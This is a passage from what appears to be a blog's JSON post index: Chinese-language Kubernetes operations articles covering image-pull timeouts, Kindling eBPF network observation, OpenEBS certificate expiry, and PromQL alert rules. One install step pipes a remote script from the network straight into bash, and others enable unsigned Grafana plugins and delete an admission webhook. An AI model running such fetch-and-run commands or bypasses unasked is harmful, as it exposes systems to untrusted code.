vars.digest=\u0026#34;sha256:2c618d17e28be23c5c38b084bfb3f288371bbed89181e57f7cf43f535261e354\u0026#34; vars.name=\u0026#34;x/x\u0026#34; LB 报错 1 (104: Connection reset by peer) while reading upstream 大镜像无法拉取的特征:\n较小的镜像层可以拉取成功，只有少量大的单层镜像失败 大镜像层拉取不断重试 其他小镜像可以拉取成功 结合上面的日志，我的判断是受某个组件设置的超时影响，导致拉取一段时间就会断开连接。而 LB 的报错日志在网上有大量的文章描述，解决 (104: Connection reset by peer) 的方式，就是增加 buffer 或者 timeout 时间。\n这里的 timeout 时间正好和此判断相吻合。而 LB 设置的 proxy_connect_timeout、proxy_send_timeout、proxy_read_timeout 都是 60s，但苦于 LB 服务因为各种原因无法修改这些参数，只能另寻他法。如果你遇到类似的情况，可以试试修改 LB 的这些参数值试试。\n最终，我直接跳过了 LB，将 Mirror Cache 直接连上了 Habror。拉取链路如下:\nDocker Client -\u0026gt; Docker Daemon -\u0026gt; Mirror Cache -\u0026gt; Harbor\n这样不用 LB 转发，不仅节省了相关费用，简化了架构，还减轻了运维成本。更关键的是，大镜像也可以拉取，再也没有不停重试的情况出现。\n3. 参考 https://docs.docker.com/registry/configuration/ ","description":"","id":140,"section":"post","tags":["博文","Kubernetes","镜像仓库","镜像"],"title":"拉取大镜像报错","uri":"https://www.chenshaowen.com/blog/pull-a-large-image-and-get-an-error.html"},{"content":" 最近有一个需求，收集 Kubernetes 的外网访问情况。因此对相关项目进行了调用和试用，本篇主要是介绍如何安装 Kindling，配置 Grafana 查看 Kubernetes 网络连接数据。\n1. 什么是 Kindling Kindling 解决的是，在不入侵应用的前提下，如何观测网络的问题，其功能主要是通过暴露内核事件来实现观测。如果主机内核版本高于 4.14，可以使用 eBPF 模块；如果主机内核是低版本，采用的是 Sysdig 实现相关观测。\n下面是一张架构图:\n目前 Kindling 有两个版本，一个是开源版本，一个是商用版本。开源版本，采集数据不够详细、只能 Grafana 出图；商用版本，功能上有所增强，在项目的 Github 首页有介绍，在此不重复。\n这种基于 eBPF 将内核函数调用转换为用户空间事件，然后暴露给用户程序的技术，在未来几年，应该会有一些落地场景，也会很有意思。下面就来简单部署，使用一下开源版本的 Kindling 吧。\n2. 安装 Kindling Kindling 的开源社区运作得并不算好，文档和资料不够清晰，我整理了一份 Yaml 用于安装。\n2.1 确保内核版本大于 4.14 1 2 3 uname -a Linux node1 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 2.2 下载 Yaml 文件 1 2 3 git clone https://github.com/shaowenchen/demo cd kindling/yaml 2.3 安装 Kindling 1 kubectl apply -f ./ 2.4 查看 Pod 状态 1 2 3 4 5 6 7 8 9 kubectl -n kindling get pod NAME READY STATUS RESTARTS AGE kindling-agent-8xt7c 1/1 Running 0 2d20h kindling-agent-bvxzc 1/1 Running 0 2d20h kindling-agent-l9phl 1/1 Running 0 2d20h kindling-agent-nx5zh 1/1 Running 0 2d20h kindling-agent-qd9cs 1/1 Running 0 2d20h kindling-agent-sxglf 1/1 Running 0 2d20h 2.5 Pod 可能一直 CrashLoopBackOff Pod 一直 CrashLoopBackOff，这是由于 kindling-agent 的镜像与当前系统不匹配导致。需要重新编译镜像:\n安装 kernel headers Ubuntu 执行命令:\n1 apt-get -y install linux-headers-$(uname -r) CentOs 执行命令:\n1 yum -y install kernel-devel-$(uname -r) 编译生成新的镜像 1 bash -c \u0026#34;$(curl -fsSL https://k8s-bpf-probes-public.oss-cn-hangzhou.aliyuncs.com/recompile-module.sh)\u0026#34; 将镜像 tag 为 Yaml 中定义的镜像 1 docker tag kindlingproject/kindling-agent:bymyself shaowenchen/kindling-agent:ubuntu-20.04 重启 Pod 即可 1 kubeclt -n kindling delete pod kindling-agent-xxx 替代 kindling-agent 镜像时的技巧 需要将 kindling-agent 的镜像拉取策略改为 IfNotPresent。\n1 imagePullPolicy: IfNotPresent 这里需要注意的是，如果你的基础设施比较统一，只有一种操作系统一种内核版本，那么可以将镜像 tag 为自己的私有镜像，然后推送到远端，修改 kindling-agent Daemonset 镜像地址即可。\n如果你的基础设施不统一，一个集群包含有多种主机、多种操作系统、多种内核版本，那么可以在这些特殊的系统上进行逐个编译。由于 Daemonset 只能设置一个镜像名，需要保持所有 Kubernetes 节点重新编译的 kindling-agent 镜像名一致。\n3. 安装 Grafana 插件并导入面板 3.1 安装 topo-plugin 插件 由于，我常用的 Grafana 是采用 Docker 部署的，安装插件过程稍显复杂。\n下载插件 1 2 git clone https://github.com/shaowenchen/demo cd kindling/dashboard 将插件拷贝至容器内 1 docker cp topo-plugin.tar.gz 392fe26ae57f:/var/lib/grafana/plugins/ 其中的 392fe26ae57f 为 Grafana 运行的容器 ID。\n进入容器创建目录 1 docker exec -it 392fe26ae57f sh 在容器中，创建目录解压插件 1 2 3 4 5 6 7 8 9 cd /var/lib/grafana/plugins/ mkdir kindlingproject-topology-panel mv topo-plugin.tar.gz kindlingproject-topology-panel/ cd kindlingproject-topology-panel/ tar xvf topo-plugin.tar.gz 配置插件 /etc/grafana/grafana.ini 是只读文件，因此需要将其拷贝到容器外，修改之后，再拷贝覆盖原文件。\n1 docker cp 392fe26ae57f:/etc/grafana/grafana.ini grafana.ini 本地编辑 grafana.ini 文件，新增如下内容\n1 2 [plugins] allow_loading_unsigned_plugins = kindlingproject-topology-panel 将修改后的 grafana.ini 文件拷贝回容器覆盖原文件\n1 docker cp grafana.ini 392fe26ae57f:/etc/grafana/grafana.ini 重启 Grafana 1 docker restart 392fe26ae57f 3.2 导入 Grafana 面板 我使用的 Grafana 版本是 8.3.1。\n相关的 Dashboard Json 文件在 https://github.com/shaowenchen/demo/tree/master/kindling/dashboard 有备份。\n相较于 Kindling 官方提供的 Dashboard 主要是增加了 DataSource 字段用于切换数据源，方便在不同的集群上查看监控数据。\n4. 查看 kindling-agent 上报的数据 下面是截图:\n在面板上，可以看到 DNS，四元组相关的一些信息，甚至还能看到命令空间、Service 之间的网络拓扑。资源消耗方面，也可以接受:\n1 2 3 4 5 6 7 8 9 kubectl -n kindling top pod NAME CPU(cores) MEMORY(bytes) kindling-agent-8xt7c 32m 444Mi kindling-agent-bvxzc 31m 337Mi kindling-agent-l9phl 63m 413Mi kindling-agent-nx5zh 62m 255Mi kindling-agent-qd9cs 99m 452Mi kindling-agent-sxglf 34m 701Mi 在上面的一些图中，可以发现有些数据是空缺的，还有一些字段显示 NOT_FOUND_INTERNAL，项目的体验不算很好。\n通过 PromQL 语句，我获取到了集群对外部访问的 IP 列表。\n1 count by (dst_ip) (kindling_trace_request_duration_nanoseconds{dst_ip!~\u0026#34;127..*|10..*|172..*\u0026#34;}) 5. 参考 http://www.kindling.space:33215/project-1/doc-35/ https://github.com/CloudDectective-Harmonycloud/kindling ","description":"","id":141,"section":"post","tags":["博文","Kubernetes","Kindling","网络"],"title":"使用 Kindling 观测 Kubernetes 的网络连接","uri":"https://www.chenshaowen.com/blog/insight-kubernetes-network-by-kindling.html"},{"content":"1. 安装方式 1 2 kubectl apply -f https://openebs.github.io/charts/openebs-operator.yaml kubectl patch storageclass openebs-hostpath -p \u0026#39;{\u0026#34;metadata\u0026#34;: {\u0026#34;annotations\u0026#34;:{\u0026#34;storageclass.kubernetes.io/is-default-class\u0026#34;:\u0026#34;true\u0026#34;}}}\u0026#39; OpenEBS 主要用来给 Tekton 流水线作为默认的存储使用。之前，我也试过 Longhorn，但是高峰期扛不住，流水线 Pending。而卸载 Longhorn 之后有残留，导致 kube-apiserver 一直报错，最后花了很大力气才删除。\n2. Kubernetes 集群证书过期之后，OpenEBS 不可用 Kubernetes 集群和 OpenEBS 组件是同一天安装的。Kubernetes 证书过期之后，通过 kubeadm certs renew all 很快完成了更新；之前一直没太关注的 OpenEBS 证书也过期了。\nTekton Controller 报错 1 2 3 4 {\u0026#34;level\u0026#34;:\u0026#34;info\u0026#34;,\u0026#34;ts\u0026#34;:\u0026#34;2022-09-08T07:58:39.882Z\u0026#34;, \u0026#34;logger\u0026#34;:\u0026#34;tekton-pipelines-controller.event-broadcaster\u0026#34;, \u0026#34;caller\u0026#34;:\u0026#34;record/event.go:282\u0026#34;, \u0026#34;msg\u0026#34;:\u0026#34;Event(v1.ObjectReference{Kind:\\\u0026#34;PipelineRun\\\u0026#34;, Namespace:\\\u0026#34;qsearch\\\u0026#34;, Name:\\\u0026#34;p-cccq1buj5i3oh0tp2ueg\\\u0026#34;, UID:\\\u0026#34;a1e15eee-4c44-4867-ac0e-decc16a1a0c8\\\u0026#34;, APIVersion:\\\u0026#34;tekton.dev/v1beta1\\\u0026#34;, ResourceVersion:\\\u0026#34;230683178\\\u0026#34;, FieldPath:\\\u0026#34;\\\u0026#34;}): type: \u0026#39;Warning\u0026#39; reason: \u0026#39;InternalError\u0026#39; 1 error occurred:\\n\\t* failed to create PVC pvc-6dc4355ffe: Internal error occurred: failed calling webhook \\\u0026#34;admission-webhookopenebs.io\\\u0026#34;: Post \\\u0026#34;https://admission-server-svc.openebs.svc:443/validate?timeout=5s\\\u0026#34;: x509: certificate has expired or is not yet valid: current time 2022-09-08T07:58:39Z is after 2022-09-08T07:17:40Z\\n\\n\u0026#34;,\u0026#34;commit\u0026#34;:\u0026#34;7ca5d61\u0026#34;} OpenEBS Admission Server 报错 1 2022/09/08 07:53:45 http: TLS handshake error from x.x.x.x:5838: remote error: tls: bad certificate 3. 解决办法 备份 openebs-validation-webhook-cfg 1 kubectl get ValidatingWebhookConfiguration openebs-validation-webhook-cfg -o yaml \u0026gt; openebs-validation-webhook-cfg.yaml 删除 openebs-validation-webhook-cfg 1 kubectl delete ValidatingWebhookConfiguration openebs-validation-webhook-cfg 这是社区 Issues 给出的一个方案，参考链接: https://github.com/openebs/openebs/issues/3329 。\n看起来 OpenEBS 社区还没有复现出这个问题，也没来得及修复。最近我刚升级 OpenEBS 到 openebs/admission-server:2.12.1 版本。\n4. Why 当我们删除 openebs-validation-webhook-cfg 时，删除的是什么 查看删除的对象:\n1 2 3 4 5 6 7 8 9 10 11 cat openebs-validation-webhook-cfg.yaml apiVersion: admissionregistration.k8s.io/v1 kind: ValidatingWebhookConfiguration metadata: name: openebs-validation-webhook-cfg webhooks: - admissionReviewVersions: - v1 clientConfig: caBundle: xxx 将证书进行 Base64 解码:\n1 echo xxx | base64 -d \u0026gt; openebs.crt 查看证书详情:\n1 2 3 4 5 6 7 8 9 10 11 12 openssl x509 -noout -text -in openebs.crt Certificate: Data: Version: 3 (0x2) Serial Number: 0 (0x0) Signature Algorithm: sha256WithRSAEncryption Issuer: CN = admission-server-svc-ca Validity Not Before: Sep 8 07:17:40 2021 GMT Not After : Sep 6 07:17:40 2031 GMT Subject: CN = admission-server-svc-ca 实际上 openebs-validation-webhook-cfg 中的证书并未过期，删除 openebs-validation-webhook-cfg 意味着在调用 OpenEBS 服务时，不进行准入控制，不校验数据的合法性。kube-apiserver 不会调用 admission-server-svc.openebs.svc，也就不会报错。\n到底是什么证书过期 在 admission-server-secret 中，我找到了两个证书，一个是 app.crt，一个是 ca.crt。\n1 2 3 4 5 6 7 kubectl -n openebs get secret admission-server-secret -o yaml apiVersion: v1 data: app.crt: xxxx app.pem: xxxx ca.crt: xxx ca.crt 证书和上面的一样，是一个十年期的证书。而 app.crt 是一个一年期的证书。查看证书详情:\n1 2 3 4 5 6 7 8 9 10 11 openssl x509 -noout -text -in app.crt Certificate: Data: Version: 3 (0x2) Serial Number: 389184800153601983 (0x566a983852307bf) Signature Algorithm: sha256WithRSAEncryption Issuer: CN = admission-server-svc-ca Validity Not Before: Sep 8 07:17:40 2021 GMT Not After : Sep 8 07:17:40 2022 GMT 怎么更新证书 在最新安装的 OpenEBS 版本中，已经找不到 admission-server-secret 这个对象，也没有 openebs-validation-webhook-cfg。同时，在升级 OpenEBS 的集群上也没有找到引用证书的地方，甚是奇怪。\n1 2 3 4 kubectl -n openebs get all,sa,secret -o yaml|grep admission-server-secret name: admission-server-secret selfLink: /api/v1/namespaces/openebs/secrets/admission-server-secret 我的怀疑是，一年前安装的 OpenEBS 是有 admission-server-secret 用于 ValidatingWebhookConfiguration 的。最近一次 OpenEBS 升级残留了之前版本的配置，导致了这次奇怪的现象。\n由于没有地方引用这个证书，也就不需要更新，直接备份之后删掉就行。\n","description":"","id":142,"section":"post","tags":["博文","OpenEBS","存储","Kubernetes","Tekton"],"title":"OpenEBS 证书过期导致服务不可用","uri":"https://www.chenshaowen.com/blog/expiration-of-the-openebs-cert.html"},{"content":"1. 平台化才能让你走得更远 只要你比竞争对手响应市场快一点，活得久一点，就能争取更多生存的空间。绝妙的商业模式、市场机遇更像是魔法，能迅速壮大公司，但并不是人力可控的范畴。我们能做的是打磨好工具、平台，以待风起时变，稍能驾驭便能青云直上。\n平台建设是长周期、高收益的投资。平台会伴随着公司一起成长，大的公司一定有好的支撑平台。\n大部分的小公司都活不过 3-5 年，小公司不会大力建设平台，但它们会非常乐于尝试新鲜的技术。新技术意味着不够成熟、不够稳定，但能获得额外的竞争力。比如，采用了新的发布系统，能同时支持 10 个版本的灰度，大大加快了产品的迭代速度，提升了产品在市场上的竞争力。\n新的平台确实给小公司带来了收益，但随着公司的发展，这种拿来即用的平台逐渐无法满足业务的需求，我们得不断地投入人力维护别人的平台，或者愿意为之付费。\n需要注意的是平台支撑业务增长的边际收益长期是递减的。其中的原因在于，短期受益于自身规模增长，随着人员在招聘市场的流动，会逐步抹平与竞争对手之间的优势，降低因平台带来的收益。当平台的先进性缺失，获得的超额收益不足以覆盖为之支出的成本时，公司就会开始寻找新的平台。\n一定程度上，平台的先进性代表着公司生产工具的先进性。领先的平台服务会让公司在市场更具竞争优势。\n2. 认知的高度决定平台的先进性 这里谈到的平台究竟谈的是什么？我认为，平台是一种知识的服务化。这种知识来自对某个领域认知的积累，可以是经验，可以是通识，可以是综合的解决方案。\n建设没有认知高度的平台，犹如造了一把冲锋枪，可能会因为使用者的无知和坏心思，造成巨大的破坏。因此在建设平台之前，我们一定要提升对领域的认知，抽象相关的概念形成适合自己业务的逻辑。\n认知的积累是一件很难的事情，而将其抽象化、普适化就更具挑战。一线团队直面业务场景，经验丰富，但忙于琐事无暇思考; 支撑团队有工具，有方法论，但又难以下沉到一线充分了解业务场景。这两个团队的合作成本很高，但也只有实现了这种经验的传播、认知的转化与提炼之后，才具备平台落地的可能。\n3. 走向服务化，远离流程 标准化是服务化的前提。只有标准化才能让小公司成长为大公司。个性化，定制化的东西，始终是小众的；普适的，通俗的东西，才具备足够的市场空间。公司成长的过程，实际上就是由局部推向全局，将小众推向大众的过程。而要让更多人接受，世俗化、规模化是不可或缺的环节。\n服务的是人。平台面对的不是听从指令的机器，而是会犯错，有疏忽、有情绪的人。平台不应该让用户先去 A、再去 B、最后 C 达成目的，而应该将 A-B-C 串起来，让用户授权。\n因此这里的的服务化，我想强调的是，用户只需授权，而无需知道内部的流程细节。就像你去银行取钱，只需要输入密码，就能拿到钱，银行不会给你一个操作手册，让你按照手册上的说明进行。\n但实际情况是，一旦一个平台动作跨团队，必须要看文档，理解流程才能完成。这种体验非常糟糕，产品形态太过机械，缺乏服务的意识。\n问题的根本原因于多团队缺少共同的愿景，面向流程的交付思维。我们应该知道的是，仅仅只是开发一个功能，并不会带来任何的用户价值，一定要等到这个功能上线，并真正使用起来。因此，应该摒弃流水作业的工作方式，一个步骤一个步骤的流转不仅效率低下，无法激发团队的积极性。\n","description":"","id":143,"section":"post","tags":["博文","平台","思考","建设"],"title":"关于平台建设的一些思考","uri":"https://www.chenshaowen.com/blog/some-thoughts-on-the-construction-of-platform.html"},{"content":" 本文描述的监控指标，仅包含 Kubernetes 基础的指标，不包含业务相关指标，相关组件为 prometheus-server、kube-state-metrics、node-exporter，数据的保存周期为 3 天。\n1. 集群中监控相关组件 1 2 3 4 helm -n monitor list NAME NAMESPACE REVISION\tUPDATED STATUS CHART APP VERSION prom-k8s\tmonitor\t1 2022-05-12 16:47:53.789549796 +0800 CST\tdeployed\tprometheus-15.0.1\t2.32.0 1 2 3 4 5 6 7 8 kubectl -n monitor get deploy,daemonset NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/prom-k8s-kube-state-metrics 1/1 1 1 102d deployment.apps/prom-k8s-prometheus-server 1/1 1 1 102d NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE daemonset.apps/prom-k8s-prometheus-node-exporter 20 20 20 20 20 \u0026lt;none\u0026gt; 102d 2. 指标计算方式 集群全部节点数 count(kube_node_created{app_kubernetes_io_instance=\u0026quot;prom-k8s\u0026quot;}) by (cluster)\n集群版本 sum by (cluster,kubelet_version)(kube_node_info{app_kubernetes_io_instance=\u0026quot;prom-k8s\u0026quot;})\n运行的 POD 数量 sum(kube_pod_info) by (cluster)\n监控组件使用的内存 sum(container_memory_working_set_bytes{image!=\u0026quot;\u0026quot;, namespace=\u0026quot;monitor\u0026quot;}) by (cluster) 监控组件使用的 CPU sum (rate (container_cpu_usage_seconds_total{namespace=\u0026quot;monitor\u0026quot;}[5m])) by (cluster)\n3. 统计数据分析 节点数量 Kuberntes 版本 POD 数量 监控占用内存 监控占用 CPU 19 v1.16.8 1046 7.04 GB 0.289 22 v1.19.15 1014 4.56 GB 0.239 28 v1.18.20 974 3.23 GB 0.187 12 v1.16.11 600 2.94 GB 0.134 8 v1.20.12 195 2.48 GB 0.598 9 v1.16.9 616 2.11 GB 0.116 13 v1.16.11 558 1.87 GB 0.096 20 v1.16.11 452 1.78 GB 0.099 14 v1.16.11 378 1.57 GB 0.064 9 v1.19.15 284 1.52 GB 0.090 6 v1.16.11 428 1.48 GB 0.102 12 v1.16.8 324 1.36 GB 0.052 9 v1.16.11 382 1.09 GB 0.065 4 v1.20.12 220 1.08 GB 0.052 12 v1.16.11 504 1.04 GB 0.060 4 v1.20.12 156 1.01 GB 0.042 4 v1.16.11 170 937.66 MB 0.055 8 v1.16.11 254 914.81 MB 0.053 10 v1.16.8 435 907.60 MB 0.032 10 v1.16.11 278 852.69 MB 0.034 11 v1.16.11 420 839.70 MB 0.047 7 v1.16.11 268 815.48 MB 0.046 4 v1.16.11 248 804.21 MB 0.032 9 v1.16.11 256 784.44 MB 0.034 10 v1.16.11 284 776.07 MB 0.047 6 v1.16.11 222 745.46 MB 0.034 8 v1.16.11 252 709.10 MB 0.034 5 v1.16.11 200 678.32 MB 0.036 7 v1.16.11 202 642.48 MB 0.037 5 v1.16.8 174 640.41 MB 0.030 7 v1.20.12 97 624.49 MB 0.025 6 v1.16.11 198 590.52 MB 0.029 6 v1.20.12 95 578.39 MB 0.034 7 v1.16.11 222 569.38 MB 0.032 6 v1.16.11 140 560.03 MB 0.027 8 v1.16.11 166 557.45 MB 0.028 5 v1.20.12 70 494.62 MB 0.019 5 v1.16.11 120 455.13 MB 0.024 6 v1.16.8 112 449.50 MB 0.022 7 v1.16.11 128 448.15 MB 0.026 6 v1.16.11 112 441.64 MB 0.022 6 v1.16.11 112 437.66 MB 0.026 2 v1.16.11 84 326.72 MB 0.024 2 v1.20.15 11 208.16 MB 0.012 每个集群平均 POD 数量 306 个，平均内存占用 1246 MB，一个 POD 大约占用 40 MB 内存，CPU 消耗基本可以忽略。\n","description":"","id":144,"section":"post","tags":["博文","Kubernetes","计算","预估"],"title":"如何预估 Kubernetes 集群中监控组件的资源消耗","uri":"https://www.chenshaowen.com/blog/how-to-estimate-the-resource-request-at-monitoring-kubernetes.html"},{"content":"主机 主机内存使用率超过阈值 1 - node_memory_MemAvailable_bytes{mode!=\u0026quot;idle\u0026quot;} / node_memory_MemTotal_bytes\n阈值：0.9\n主机 CPU 使用率超过阈值 1 - avg(irate(node_cpu_seconds_total{mode=\u0026quot;idle\u0026quot;}[5m])) by (host_name)\n阈值：0.85\n主机硬盘使用率超过阈值 1 - avg without (fstype)(node_filesystem_free_bytes{fstype!='rootfs',mountpoint!~'/(run|var|snap).*'} / node_filesystem_size_bytes{fstype!='rootfs',mountpoint!~'/(run|var|snap).*'})\n阈值：0.8\nWindows Windows 主机内存使用率超过阈值 1 - 1 * windows_os_physical_memory_free_bytes{job=\u0026quot;windows_exporter\u0026quot;,mode!=\u0026quot;idle\u0026quot;} / windows_cs_physical_memory_bytes\n阈值：0.9\nWindows 主机 CPU 使用率超过阈值 1 - (avg by (host_ip,host_name) (irate(windows_cpu_time_total{job=\u0026quot;windows_exporter\u0026quot;,mode=\u0026quot;idle\u0026quot;}[1m])))\n阈值：0.85\nWindows 主机硬盘使用率超过阈值 1 - windows_logical_disk_free_bytes{job=\u0026quot;windows_exporter\u0026quot;,volume!~\u0026quot;HarddiskVolume.*\u0026quot;} / windows_logical_disk_size_bytes\n阈值：0.8\nKubernetes 内存 10 分钟内快速增加 increase(sum(container_memory_working_set_bytes{container!~\u0026quot;POD\u0026quot;, image!=\u0026quot;\u0026quot;,name=~\u0026quot;^k8s_.*\u0026quot;}) by (pod, namespace, cluster)) [10m] / sum(container_memory_working_set_bytes{container!~\u0026quot;POD\u0026quot;, image!=\u0026quot;\u0026quot;,name=~\u0026quot;^k8s_.*\u0026quot;}) by (pod, namespace, cluster) offset 10m\n阈值: 大于 1\n大内存应用检测 sum(container_memory_working_set_bytes{container!~\u0026quot;POD\u0026quot;, image!=\u0026quot;\u0026quot;,name=~\u0026quot;^k8s_.*\u0026quot;}) by (pod, namespace, cluster)/1024/1024/1024\n阈值: 大于 2，单位 GB\nPod CPU 被限制核数 sum (rate (container_cpu_cfs_throttled_seconds_total{name=~\u0026quot;^k8s_.*\u0026quot;}[5m])) by (pod)\n阈值: 大于 1\nPod CPU 被限制比例 sum by (cluster, namespace, pod)(irate(container_cpu_cfs_throttled_periods_total{container!=\u0026quot;POD\u0026quot;, container!=\u0026quot;\u0026quot;}[5m])) / sum by (cluster, namespace, pod)( irate(container_cpu_cfs_periods_total{container!=\u0026quot;POD\u0026quot;, container!=\u0026quot;\u0026quot;}[5m])) \u0026gt; 0.5\n阈值: 大于 0.5\n另一种写法是\nsum by (cluster, namespace, pod) (irate (container_cpu_cfs_throttled_seconds_total{name=~\u0026quot;^k8s_.*\u0026quot;}[10s])) / sum by (cluster, namespace, pod) (kube_pod_container_resource_limits{resource=\u0026quot;cpu\u0026quot;}) \u0026gt; 0.5\nPOD 10 分钟重启次数超过3次 sum (increase (kube_pod_container_status_restarts_total{}[10m])) by (cluster, namespace,pod)\n阈值：大于 3\n10 分钟内 POD 发生 OOM sum by (namespace,pod) ((kube_pod_container_status_restarts_total{} - kube_pod_container_status_restarts_total{} offset 10m \u0026gt;= 1) and ignoring (reason) min_over_time(kube_pod_container_status_last_terminated_reason{reason='OOMKilled'}[10m]) == 1)\n阈值：大于 2\nPOD 等待 sum by (namespace, pod, reason) (kube_pod_container_status_waiting_reason{})\n阈值：大于 0\nPOD Pending sum by (namespace, pod)(kube_pod_status_ready{condition='false'})\n阈值：大于 0\n集群数量发生变化 count(count(kube_node_created{}) by (cluster))\n阈值：不等于真实值\n5 分钟不可用节点增量 sum(kube_node_status_condition{status!=\u0026quot;true\u0026quot;}) by (cluster, exported_node, condition) - sum(kube_node_status_condition{status!=\u0026quot;true\u0026quot;} offset 5m) by (cluster, exported_node, condition)\n阈值：大于 0\n节点时间不同步 min_over_time(node_timex_sync_status[5m])\n阈值：等于 0\ncontroller 的调度深度 sum by (cluster) (workqueue_depth{})\n阈值：大于 0\n5 分钟队列增加总数 sum by (cluster) (rate(workqueue_adds_total{}[5m]))\n阈值：大于 50\n对象在队列中停留的时间 histogram_quantile(0.99, sum(rate(workqueue_queue_duration_seconds_bucket{}[5m])) by (cluster, le))\n阈值：大于 0.5\nClickHouse 副本同步队列出现堆积 clickhouse_replicas_max_queue_size{}\n阈值：大于 100\nElasticsearch Elastic_Cluster_Health_RED 有主分片没能正常运行 elasticsearch_cluster_health_status{color=\u0026quot;red\u0026quot;}\n阈值：等于 1\nElasticsearch_health_up 集群处于非健康状态 elasticsearch_cluster_health_up{}\n阈值：不等于 1\nES heap 内存占用率高于90% sum by ( cluster_name, host) (elasticsearch_jvm_memory_used_bytes{area=\u0026quot;heap\u0026quot;}) / sum by ( cluster_name, host) (elasticsearch_jvm_memory_max_bytes{area=\u0026quot;heap\u0026quot;})\n阈值：大于 0.9\nES 待处理的任务数大于 10 elasticsearch_cluster_health_number_of_pending_tasks{}\n阈值：大于10\nMongoDB MongoDB ops commands操作过高 mongodb_commands_per_sec{} or cloudwatch_aws_doc_db_opcounters_command_average{}\n阈值：大于 5000\nMongoDB链接数过高 mongodb_open_connections{} or cloudwatch_aws_doc_db_database_connections_average{}\n阈值：大于5000\nMongoDB wiredTiger cache达到驱逐阀值 sum by (cluster_name) (mongodb_wtcache_current_bytes{}) / sum by (cluster_name) (mongodb_wtcache_max_bytes_configured{}) * 100\n阈值：大于90\nMongoDB wiredTiger dirty cache 达到驱逐阀值 sum by (cluster_name) (mongodb_wtcache_tracked_dirty_bytes{}) / sum by (cluster_name) (mongodb_wtcache_max_bytes_configured{}) * 100 阈值：大于20\nRedis 服务状态异常 redis_up{job=\u0026quot;telegraf\u0026quot;}\n阈值：小于 1\ninstance 当前内存使用率过大 redis_memory_used_bytes{job=\u0026quot;telegraf\u0026quot;} / redis_config_maxmemory\n阈值: 大于0.8\ninstance 内存使用率10分钟增长超过50% (redis_memory_used_bytes{job=\u0026quot;telegraf\u0026quot;} / redis_config_maxmemory) - (redis_memory_used_bytes{job=\u0026quot;telegraf\u0026quot;} offset 10m / redis_config_maxmemory offset 10m)\n阈值：大于 0.5\ncluster 当前内存使用率过大 sum(redis_memory_used_bytes{job=\u0026quot;telegraf\u0026quot;}) by (cluster_name) / sum(redis_config_maxmemory{job=\u0026quot;telegraf\u0026quot;}) by (cluster_name)\n阈值: 大于 0.8\ncluster 内存使用率10分钟增长超过10% (sum(redis_memory_used_bytes{job=\u0026quot;telegraf\u0026quot;}) by (cluster_name) / sum(redis_config_maxmemory{job=\u0026quot;telegraf\u0026quot;}) by (cluster_name))- (sum(redis_memory_used_bytes{job=\u0026quot;telegraf\u0026quot;}offset 10m) by (cluster_name) / sum(redis_config_maxmemory{job=\u0026quot;telegraf\u0026quot;}offset 10m) by (cluster_name))\n阈值：大于 0.1\nQPS 10分钟内增长超过30% 并且 当前QPS\u0026gt;500 sum by (cluster_name) (rate(redis_commands_processed_total{job=\u0026quot;telegraf\u0026quot;}[5m])) and ((sum by (cluster_name) (rate(redis_commands_processed_total{job=\u0026quot;telegraf\u0026quot;}[5m] )) -sum by (cluster_name) (rate(redis_commands_processed_total{job=\u0026quot;telegraf\u0026quot;}[5m] offset 10m)) ) /sum by (cluster_name) (rate(redis_commands_processed_total{job=\u0026quot;telegraf\u0026quot;\u0026quot;}[5m] offset 10m))\u0026gt; 0.3)\n阈值：大于 500\n连接数 10分钟内增长超过30% 并且 当前连接数\u0026gt;500 sum by (cluster_name) (redis_connected_clients{job=\u0026quot;telegraf\u0026quot;}) and (((sum by (cluster_name) (redis_connected_clients{job=\u0026quot;telegraf\u0026quot;}) -sum by (cluster_name) (redis_connected_clients{job=\u0026quot;telegraf\u0026quot;}offset 10m))) / sum by (cluster_name) (redis_connected_clients{job=\u0026quot;telegraf\u0026quot;}offset 10m)\u0026gt; 0.3)\n阈值：\u0026gt; 500\nRabbitMQ 实例探活异常 avg by (cluster_name,addr) (rabbitmq_up{})\n阈值：\u0026lt; 1\n内存使用率过大 sum by (cluster_name,region,addr) (rabbitmq_node_mem_used{}) / sum by (cluster_name,region,addr) (rabbitmq_node_mem_limit{})\n阈值：\u0026gt; 0.85\n连接数使用率过大 sum by (cluster_name,region,addr) (rabbitmq_sockets_used{}) / sum by (cluster_name,region,addr) (rabbitmq_sockets_available{})\n阈值：\u0026gt; 0.85\nPika Pika 节点ops过高 sum by(cluster_name, addr ) (rate(pika_total_commands_processed[5m]))\n阈值：\u0026gt; 120000\nPika 节点状态异常 avg(pika_up{}) by (cluster_name,addr)\n阈值：\u0026lt; 1\nPika slave lag过大 avg(pika_slave_lag{}) by (cluster_name,addr)\n阈值：\u0026gt;100000\nPika master 连接异常 avg(pika_master_link_up{}) by (cluster_name,addr)\n阈值：\u0026lt;1\nMySQL 磁盘使用率过大 (huaweicloud_sys_rds_rds048_disk_used_size / huaweicloud_sys_rds_rds047_disk_total_size) or (1 - aws_rdsdisk_free / aws_rdsdisk_total)\n阈值：\u0026gt; 0.8\nCPU 使用率过大 huaweicloud_sys_rds_rds001_cpu_util or aws_rds_cpuutilization_average\n阈值：\u0026gt; 80\n慢查过多 rate(mysql_slow_queries{}[5m])\n阈值：\u0026gt; 50\n连接数过大 mysql_threads_connected{}\n阈值：\u0026gt; 2000\n连接数使用率过大 mysql_threads_connected{} / mysql_max_used_connections{}\n阈值：\u0026gt; 0.9\nMySQL QPS过大 rate(mysql_queries{}[5m])\n阈值：\u0026gt; 8000\nMySQL 探活失败 mysql_up{job=\u0026quot;telegraf-mysql\u0026quot;}\n阈值：\u0026lt; 1\nMySQL 磁盘使用率过大 ((huaweicloud_sys_rds_rds048_disk_used_size / huaweicloud_sys_rds_rds047_disk_total_size) and on (name) mysql_up{}) or ((1 - aws_rdsdisk_free / aws_rdsdisk_total) and on (name) mysql_up{})\n阈值 \u0026gt; 0.8\nMySQL CPU使用率过大 (huaweicloud_sys_rds_rds001_cpu_util and on (name) mysql_up{}) or (aws_rds_cpuutilization_average and on (dbinstance_identifier) mysql_up{})\n阈值：\u0026gt; 80\nKafka kafka队列积压过多 avg without(host_ip) (sum by(consumergroup, topic, cluster_name, host_ip) (kafka_consumergroup_lag{})) \u0026gt; 1000 and on (cluster_name, consumergroup, topic ) sum without(partition, job, host_ip) (delta(kafka_consumergroup_current_offset{}[1d]))\n阈值：!= 